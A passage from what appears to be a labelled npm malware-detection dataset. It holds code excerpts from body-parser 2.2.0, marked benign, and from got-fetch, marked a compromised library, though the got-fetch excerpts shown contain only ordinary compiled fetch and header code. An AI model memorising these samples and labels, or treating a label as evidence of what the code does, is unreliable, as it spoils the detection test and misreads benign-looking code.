        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/raw.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/raw.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/raw.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/text.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/text.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/text.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/index.js": "function bodyParser () {\n  throw new Error('The bodyParser() generic has been split into individual middleware to use instead.')\n}\n",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js": "function dump (req, callback) {\n  if (onFinished.isFinished(req)) {\n    callback(null)\n  } else {\n    onFinished(req, callback)\n    req.resume()\n  }\n}\n",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js": "function normalizeOptions (options, defaultType) {\n  if (!defaultType) {\n    // Parsers must define a default content type\n    throw new TypeError('defaultType must be provided')\n  }\n\n  var inflate = options?.inflate !== false\n  var limit = typeof options?.limit !== 'number'\n    ? bytes.parse(options?.limit || '100kb')\n    : options?.limit\n  var type = options?.type || defaultType\n  var verify = options?.verify || false\n\n  if (verify !== false && typeof verify !== 'function') {\n    throw new Typ",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/raw.js": "function rawParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldParse(req)) {\n      debug('skip parsing')\n      next()",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js": "function parameterCount (body, limit) {\n  var len = body.split('&').length\n\n  return len > limit ? undefined : len - 1\n}\n",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js": "function normalizeJsonSyntaxError (error, obj) {\n  var keys = Object.getOwnPropertyNames(error)\n\n  for (var i = 0; i < keys.length; i++) {\n    var key = keys[i]\n    if (key !== 'stack' && key !== 'message') {\n      delete error[key]\n    }\n  }\n\n  // replace stack before message for Node.js 0.10 and below\n  error.stack = obj.stack.replace(error.message, obj.message)\n  error.message = obj.message\n\n  return error\n}\n",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/text.js": "function textParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldParse(req)) {\n      debug('skip parsing')\n      next("
      },
      "package_size_bytes": 16936,
      "num_files": 28,
      "metadata": {
        "package_hash": "npm_body-parser_2.2.0",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "got-fetch",
      "ecosystem": "npm",
      "sample_type": "compromised_lib",
      "ground_truth_label": 1,
      "raw_content": "\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js (function)\nfunction adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }\n    return new (P || (P = Promise))(function (resolve, reject) {\n        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n    \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js (function)\nfunction fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar __classPrivateFieldGet = (this && this.__classPrivateFieldGet) || function (receiver, state,\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js (function)\nfunction rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar __classPrivateFieldGet = (this && this.__classPrivateFieldGet) || function (receiver, state, kind, f) {\n    if (kind === \"a\" && !f) throw new TypeError(\"Private accessor was defined without a \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js (function)\nfunction step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar __classPrivateFieldGet = (this && this.__classPrivateFieldGet) || function (receiver, state, kind, f) {\n    if (kind === \"a\" && !f) throw new TypeError(\"Private accessor was defined without a getter\");\n    if (typeof state === \"function\" ? receiver !== state || !f : !state.has(receiver)) throw \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js (function)\nfunction verb(n) { i[n] = o[n] && function (v) { return new Promise(function (resolve, reject) { v = o[n](v), settle(resolve, reject, v.done, v.value); }); }; }\n    function settle(resolve, reject, d, v) { Promise.resolve(v).then(function(v) { resolve({ value: v, done: d }); }, reject); }\n};\nvar _GotFetchResponse_bodyUsed;\nimport { format } from 'util';\nimport { GotHeaders } from './headers.js';\nexport class GotFetchResponse {\n    constructor(body, init) {\n        _GotFetchResponse_bodyUsed.set(\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js (function)\nfunction settle(resolve, reject, d, v) { Promise.resolve(v).then(function(v) { resolve({ value: v, done: d }); }, reject); }\n};\nvar _GotFetchResponse_bodyUsed;\nimport { format } from 'util';\nimport { GotHeaders } from './headers.js';\nexport class GotFetchResponse {\n    constructor(body, init) {\n        _GotFetchResponse_bodyUsed.set(this, false);\n        if (init && typeof init.status === 'number' && (init.status < 200 || init.status > 599)) {\n            throw new RangeError(format('init.status\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }\n    return new (P || (P = Promise))(function (resolve, reject) {\n        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n    \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar __await = (this && this.__await) || function (v) { return this instanceof __await ? (this.v \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar __await = (this && this.__await) || function (v) { return this instanceof __await ? (this.v = v, this) : new __await(v); }\nvar __asyncValues = (this && this.__asyncValues) || function (o) {\n  \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar __await = (this && this.__await) || function (v) { return this instanceof __await ? (this.v = v, this) : new __await(v); }\nvar __asyncValues = (this && this.__asyncValues) || function (o) {\n    if (!Symbol.asyncIterator) throw new TypeError(\"Symbol.asyncIterator is not defined.\");\n    var m = o\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction verb(n) { i[n] = o[n] && function (v) { return new Promise(function (resolve, reject) { v = o[n](v), settle(resolve, reject, v.done, v.value); }); }; }\n    function settle(resolve, reject, d, v) { Promise.resolve(v).then(function(v) { resolve({ value: v, done: d }); }, reject); }\n};\nvar __asyncGenerator = (this && this.__asyncGenerator) || function (thisArg, _arguments, generator) {\n    if (!Symbol.asyncIterator) throw new TypeError(\"Symbol.asyncIterator is not defined.\");\n    var g = g\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction settle(resolve, reject, d, v) { Promise.resolve(v).then(function(v) { resolve({ value: v, done: d }); }, reject); }\n};\nvar __asyncGenerator = (this && this.__asyncGenerator) || function (thisArg, _arguments, generator) {\n    if (!Symbol.asyncIterator) throw new TypeError(\"Symbol.asyncIterator is not defined.\");\n    var g = generator.apply(thisArg, _arguments || []), i, q = [];\n    return i = {}, verb(\"next\"), verb(\"throw\"), verb(\"return\"), i[Symbol.asyncIterator] = function () { return \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction verb(n) { if (g[n]) i[n] = function (v) { return new Promise(function (a, b) { q.push([n, v, a, b]) > 1 || resume(n, v); }); }; }\n    function resume(n, v) { try { step(g[n](v)); } catch (e) { settle(q[0][3], e); } }\n    function step(r) { r.value instanceof __await ? Promise.resolve(r.value.v).then(fulfill, reject) : settle(q[0][2], r); }\n    function fulfill(value) { resume(\"next\", value); }\n    function reject(value) { resume(\"throw\", value); }\n    function settle(f, v) { if (f(v), q\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction resume(n, v) { try { step(g[n](v)); } catch (e) { settle(q[0][3], e); } }\n    function step(r) { r.value instanceof __await ? Promise.resolve(r.value.v).then(fulfill, reject) : settle(q[0][2], r); }\n    function fulfill(value) { resume(\"next\", value); }\n    function reject(value) { resume(\"throw\", value); }\n    function settle(f, v) { if (f(v), q.shift(), q.length) resume(q[0][0], q[0][1]); }\n};\nimport { URL, URLSearchParams } from 'url';\nimport { format } from 'util';\nimport { GotFetch\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction step(r) { r.value instanceof __await ? Promise.resolve(r.value.v).then(fulfill, reject) : settle(q[0][2], r); }\n    function fulfill(value) { resume(\"next\", value); }\n    function reject(value) { resume(\"throw\", value); }\n    function settle(f, v) { if (f(v), q.shift(), q.length) resume(q[0][0], q[0][1]); }\n};\nimport { URL, URLSearchParams } from 'url';\nimport { format } from 'util';\nimport { GotFetchResponse } from './response.js';\nimport { finished, Readable } from \"node:stream\";\nimpo\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction fulfill(value) { resume(\"next\", value); }\n    function reject(value) { resume(\"throw\", value); }\n    function settle(f, v) { if (f(v), q.shift(), q.length) resume(q[0][0], q[0][1]); }\n};\nimport { URL, URLSearchParams } from 'url';\nimport { format } from 'util';\nimport { GotFetchResponse } from './response.js';\nimport { finished, Readable } from \"node:stream\";\nimport { once } from \"node:events\";\nconst getMethodsWithBody = new Set([\"GET\", \"HEAD\"]);\nexport function createFetch(got) {\n    c\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction reject(value) { resume(\"throw\", value); }\n    function settle(f, v) { if (f(v), q.shift(), q.length) resume(q[0][0], q[0][1]); }\n};\nimport { URL, URLSearchParams } from 'url';\nimport { format } from 'util';\nimport { GotFetchResponse } from './response.js';\nimport { finished, Readable } from \"node:stream\";\nimport { once } from \"node:events\";\nconst getMethodsWithBody = new Set([\"GET\", \"HEAD\"]);\nexport function createFetch(got) {\n    const globalCache = new Map();\n    return (input, opts) \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction settle(f, v) { if (f(v), q.shift(), q.length) resume(q[0][0], q[0][1]); }\n};\nimport { URL, URLSearchParams } from 'url';\nimport { format } from 'util';\nimport { GotFetchResponse } from './response.js';\nimport { finished, Readable } from \"node:stream\";\nimport { once } from \"node:events\";\nconst getMethodsWithBody = new Set([\"GET\", \"HEAD\"]);\nexport function createFetch(got) {\n    const globalCache = new Map();\n    return (input, opts) => __awaiter(this, void 0, void 0, function* () {\n     \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction createFetch(got) {\n    const globalCache = new Map();\n    return (input, opts) => __awaiter(this, void 0, void 0, function* () {\n        var _a, _b;\n        const url = new URL(typeof input === 'string' ? input : input.url);\n        const request = typeof input === 'object' ? input : opts || {};\n        if (request.mode === 'no-cors' || request.mode === 'same-origin' || request.mode === 'navigate') {\n            throw new TypeError(format('request.mode not supported: %s', request.mode))\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction restream(firstChunk, req) {\n    return __asyncGenerator(this, arguments, function* restream_1() {\n        var _a, e_1, _b, _c;\n        yield yield __await(firstChunk);\n        try {\n            for (var _d = true, req_1 = __asyncValues(req), req_1_1; req_1_1 = yield __await(req_1.next()), _a = req_1_1.done, !_a;) {\n                _c = req_1_1.value;\n                _d = false;\n                try {\n                    const chunk = _c;\n                    yield yield __await(chunk);\n  \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction normaliseHeaders(headers) {\n    const out = {};\n    if (Array.isArray(headers)) {\n        headers.forEach(([header, value]) => {\n            out[header.toLowerCase()] = value;\n        });\n    }\n    else if (typeof (headers === null || headers === void 0 ? void 0 : headers.forEach) === \"function\") {\n        headers.forEach((value, header) => {\n            out[header.toLowerCase()] = value;\n        });\n    }\n    else {\n        Object.keys(headers).forEach((header) => {\n            out[hea\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js (function)\nfunction serializeBody(body) {\n    if (!body) {\n        return {};\n    }\n    else if (body instanceof URLSearchParams) {\n        const serialized = body.toString();\n        return {\n            body: serialized,\n            headers: {\n                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',\n                'Content-Length': String(Buffer.byteLength(serialized, 'utf8'))\n            }\n        };\n    }\n    else if (typeof body === 'string') {\n        return {\n            \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/body-type.js (file)\nexport {};\n//# sourceMappingURL=body-type.js.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/index.js (file)\nimport { createFetch } from './fetch.js';\nimport fetch from './global-fetch.js';\nexport { createFetch, fetch };\nexport default fetch;\n//# sourceMappingURL=index.js.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/headers.js (file)\nexport class GotHeaders {\n    constructor(headers, guard = 'none') {\n        const init = headers ? Object.entries(headers).map(([name, values]) => {\n            if (typeof values === 'string') {\n                return [name.toLowerCase(), [values]];\n            }\n            else if (Array.isArray(values)) {\n                return [name.toLowerCase(), values];\n            }\n            else {\n                return [name.toLowerCase(), []];\n            }\n        }) : [];\n        this.guard = guard;\n        this.headers = new Map(init);\n    }\n    checkGuard() {\n        if (this.guard === 'immutable') {\n            throw new TypeError('Header guard set to `immutable`');\n        }\n    }\n    append(name, value) {\n        this.checkGuard();\n        const key = name.toLowerCase();\n        this.headers.set(key, (this.headers.get(key) || []).concat([value]));\n    }\n    delete(name) {\n        this.checkGuard();\n        this.headers.delete(name.toLowerCase());\n    }\n    get(name) {\n        const values = this.headers.get(name.toLowerCase());\n        return values ? values.join(', ') : null;\n    }\n    has(name) {\n        return this.headers.has(name.toLowerCase());\n    }\n    set(name, value) {\n        this.checkGuard();\n        this.headers.set(name.toLowerCase(), [value]);\n    }\n    forEach(callbackfn, thisArg) {\n        this.headers.forEach((val, name) => {\n            callbackfn.call(thisArg, this.get(name), name, this);\n        });\n    }\n    *entries() {\n        for (const key of this.headers.keys()) {\n            yield [key, this.get(key)];\n        }\n    }\n    keys() {\n        return this.headers.keys();\n    }\n    *values() {\n        for (const key of this.headers.keys()) {\n            yield this.get(key);\n        }\n    }\n    [Symbol.iterator]() {\n        return this.entries();\n    }\n}\n//# sourceMappingURL=headers.js.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/global-fetch.js (file)\nimport got from 'got';\nimport { createFetch } from './fetch.js';\nexport default createFetch(got);\n//# sourceMappingURL=global-fetch.js.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/body-type.d.ts (file)\n/// <reference types=\"node\" />\nimport { Readable } from \"node:stream\";\nexport type Body = Readable | Blob | BufferSource | FormData | URLSearchParams | string;\n//# sourceMappingURL=body-type.d.ts.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.d.ts (file)\nimport { Got } from 'got';\nimport { GotFetchResponse } from './response.js';\nimport { Body } from \"./body-type.js\";\ntype GotFetchRequestInit = Omit<RequestInit, 'body'> & {\n    body?: Body | null;\n};\nexport type GotFetch = (input: string | (GotFetchRequestInit & {\n    url: string;\n}), init?: GotFetchRequestInit) => Promise<GotFetchResponse>;\nexport declare function createFetch(got: Got): GotFetch;\nexport {};\n//# sourceMappingURL=fetch.d.ts.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/headers.d.ts (file)\nexport type GotHeadersGuard = 'immutable' | 'none';\nexport declare class GotHeaders implements Headers {\n    private headers;\n    private guard;\n    constructor(headers?: Record<string, string | string[] | undefined>, guard?: GotHeadersGuard);\n    private checkGuard;\n    append(name: string, value: string): void;\n    delete(name: string): void;\n    get(name: string): string | null;\n    has(name: string): boolean;\n    set(name: string, value: string): void;\n    forEach(callbackfn: (value: string, key: string, parent: Headers) => void, thisArg?: unknown): void;\n    entries(): IterableIterator<[string, string]>;\n    keys(): IterableIterator<string>;\n    values(): Generator<string, void, unknown>;\n    [Symbol.iterator](): IterableIterator<[string, string]>;\n}\n//# sourceMappingURL=headers.d.ts.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.d.ts (file)\n/**\n * Spec:\n * https://fetch.spec.whatwg.org/#response-class\n */\n/// <reference types=\"node\" />\n/// <reference types=\"node\" />\nimport { IncomingHttpHeaders } from 'http2';\nimport { Body } from './body-type.js';\nimport { GotHeaders } from './headers.js';\ntype ResponseInit = {\n    status?: number;\n    statusText?: string | Buffer;\n    headers?: IncomingHttpHeaders;\n    url?: string;\n    redirected?: boolean;\n    type?: ResponseType;\n};\nexport declare class GotFetchResponse implements Response {\n    #private;\n    readonly headers: GotHeaders;\n    readonly redirected: boolean;\n    readonly status: number;\n    readonly statusText: string;\n    readonly url: string;\n    readonly type: ResponseType;\n    /**\n     * This is a Node Readable stream\n     */\n    readonly body: any | null;\n    constructor(body: Body | null, init?: ResponseInit | null);\n    get bodyUsed(): boolean;\n    get ok(): boolean;\n    get trailer(): Promise<Headers>;\n    arrayBuffer(): Promise<ArrayBuffer>;\n    blob(): Promise<Blob>;\n    formData(): Promise<FormData>;\n    json(): Promise<any>;\n    text(): Promise<string>;\n    clone(): GotFetchResponse;\n    static error(): GotFetchResponse;\n}\nexport {};\n//# sourceMappingURL=response.d.ts.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/global-fetch.d.ts (file)\ndeclare const _default: import(\"./fetch.js\").GotFetch;\nexport default _default;\n//# sourceMappingURL=global-fetch.d.ts.map\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/index.d.ts (file)\nimport { createFetch } from './fetch.js';\nimport fetch from './global-fetch.js';\nexport { createFetch, fetch };\nexport default fetch;\n//# sourceMappingURL=index.d.ts.map\n==================================================\n",
      "file_paths": [
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/body-type.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/index.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/headers.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/global-fetch.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/body-type.d.ts",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.d.ts",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/headers.d.ts",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.d.ts",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/global-fetch.d.ts",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/index.d.ts"
      ],
      "individual_files": {
